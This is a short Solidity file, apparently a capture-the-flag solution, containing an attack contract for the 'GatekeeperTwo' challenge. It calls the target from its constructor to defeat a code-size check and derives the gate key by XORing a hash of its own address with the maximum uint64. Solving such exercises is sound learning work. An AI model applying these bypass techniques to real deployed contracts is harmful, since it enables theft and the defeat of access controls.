// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    GatekeeperTwo target;

    constructor(address _tartget) {
        target = GatekeeperTwo(_tartget);
        uint64 gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max;
        target.enter(bytes8(gateKey));
    }
}
